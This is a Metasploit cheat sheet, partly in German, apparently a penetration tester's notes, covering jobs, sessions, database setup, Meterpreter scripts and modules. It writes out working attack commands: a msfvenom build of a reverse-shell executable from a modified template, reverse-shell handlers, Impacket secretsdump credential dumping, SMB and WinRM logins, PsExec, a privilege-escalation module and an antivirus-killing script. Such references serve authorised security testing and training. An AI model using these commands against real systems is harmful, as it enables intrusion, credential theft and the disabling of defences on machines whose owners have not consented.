
# Metasploit - Cheat Sheet

## Core

### Jobs
```ruby
#List Jobs
jobs -l
#Kill all Jobs
jobs -K
#Kill single Job by ID
jobs -k 1
```

### Module

```ruby
#navigate through different active modules
use exploit/multi/handler
#push module on stack
pushm
use post/multi/recon/local_exploit_suggester
set session 1
use scanner/smb/smb_login
#list stack
listm
[*] Module stack:

[1]     post/multi/recon/local_exploit_suggester
[0]     exploit/multi/handler
#go to previous module and delete it from the stack
popm
```

### use a file with IP addresses for RHOSTS

```ruby
set RHOSTS file:/home/user/iplist.txt
```

### Run (Backgroundjob)

```ruby
use exploit/multi/handler
run -p windows/shell/reverse_tcp lhost=0.0.0.0 lport=443 -j
```

### Sessions
```ruby
#List Sessions
sessions
#Select Session
sessions -i 1
```

### Search

```ruby
msf> search platform:windows port:135 target:XP type:exploit
#list available keywords
msf>help search
```
## Custom

### Custom Termplates

#### x64 template

`metasploit-framework/data/templates/src/pe/exe/template_x64_windows.asm`

4096 ändern in 8192

Kompilieren:

```batch
C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.38.33130\bin\Hostx64\x64>ml64.exe c:\tmp\template_x64_windows.asm /link /subsystem:windows /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x64\kernel32.Lib" /entry:main
```

msfvenom:

```bash
msfvenom -x template_x64_windows.asm -p windows/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4500 -f exe > file.exe
```

## Database

Datenbanken können mit `root@kali:~# msfdb init` initialisiert werden. Hierzu wird eine Datenbank mit Benutzer und Passwort erstellt und das Datenbank-Schema angelegt.

```ruby
msf6 > db_connect user:pass@localhost/msf
msf6 > db_status
msf6 > workspace
msf6 > workspace -a new_ws
msf6 > db_nmap -sP 192.168.2.0/24
msf6 > hosts
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > hosts -R
msf6 auxiliary(scanner/portscan/tcp) > run
```

### Metasploit with PostgreSQL
#### ALTER DATABASE Version mismatch

```shell
sudo -u postgres psql
\l
ALTER DATABASE <dbnames> REFRESH COLLATION VERSION;
\q
service postgresql restart
```

#### Password reset for user msf

```shell
sudo -u postgres psql
\password msf
Enter new password for user "msf": 
Enter it again: 
msfdb reinit
```

#### Port Problems with PostgreSQL 15 and 16 installed

```shell
sudo nano /etc/postgresql/16/main/postgresql.conf # find "port = 5433" and change it to "port = 5422"
sudo nano /etc/postgresql/15/main/postgresql.conf # find "port = 5432" and change it to "port = 5433"
sudo nano /etc/postgresql/16/main/postgresql.conf # find "port = 5422" and change it to "port = 5432"
```

```shell
msfdb reinit
msfdb status
```

## Meterpreter

### Modules

Liste Module

```cmd
load -l
```

## Scripts

[Reference](https://www.offsec.com/metasploit-unleashed/existing-scripts/)

```shell
meterpreter > run scriptname
```

| Scriptname        | Action                            |
| ----------------- | --------------------------------- |
| checkvm           | check if target system is a VM    |
| getcountermeasure | checks security settings          |
| getgui            | try to enable RDP                 |
| get_local_subnets | list local subnets                |
| gettelnet         | enable telnet                     |
| hostsedit         | edit the hosts file               |
| killav            | try to kill antivirus             |
| remotewinenum     | enumerate system information      |
| scraper           | enumerate more system information |
| winenum           | detailed windows enumeration      |

## Modules

### Auxiliary
#### SMB
##### Impacket Secretsdump

```ruby
use scanner/smb/impacket/secretsdump
set RHOSTS 192.168.1.1
set SMBDOMAIN domain
set SMBUSER user
set SMBPASS pass
```

##### SMB Login
```ruby
use scanner/smb/smb_login
auxiliary(scanner/smb/smb_login) > run CreateSession=true RHOSTS=172.14.2.164 RPORT=445 SMBDomain=windomain.local SMBPass=password SMBUser=username
sessions -i 1
```

#### WinRM
##### WinRM_Login
```ruby
use scanner/winrm/winrm_login
run CreateSession=true RHOSTS=172.14.2.164 SMBDomain=windomain.local SMBPass=password SMBUser=username
```

### Evasion
#### Windows Defender Exe
```ruby
set 
```
### Post
#### SMB PsExec
```ruby
use exploit/windows/smb/psexec
set rhost 127.0.0.1
set smbuser mega-admin
set smbpass p4ss
run
```
#### Local Exploit Suggester
```ruby
use post/multi/recon/local_exploit_suggester
set SESSION 1
```

#### Upgrade Shell to Meterpreter
```ruby
use post/multi/manage/shell_to_meterpreter
set SESSION 1
```

### Privilege Escalation

#### Service

```ruby
use exploit/windows/local/service_permissions
run lhost=0.0.0.0 lport=12222
```


#### UAC Enumeration

```ruby
use post/windows/gather/win_privs
set SESSION 1
```

## Plugins

### Alias

```ruby
load alias
alias s set
alias sg setg
```

#### Aliases


| Alias | Command  |
| ----- | -------- |
| sr    | search   |
| s     | set      |
| sg    | setg     |
| r     | run      |
| u     | use      |
| o     | options  |
| a     | alias    |
| adv   | advanced |
| rc    | resource |

### wiki

```ruby
load wiki

Wiki Commands
=============

    Command           Description
    -------           -----------
    dokuwiki          Outputs data from the current workspace in dokuwiki markup.
    mediawiki         Outputs data from the current workspace in mediawiki markup.

```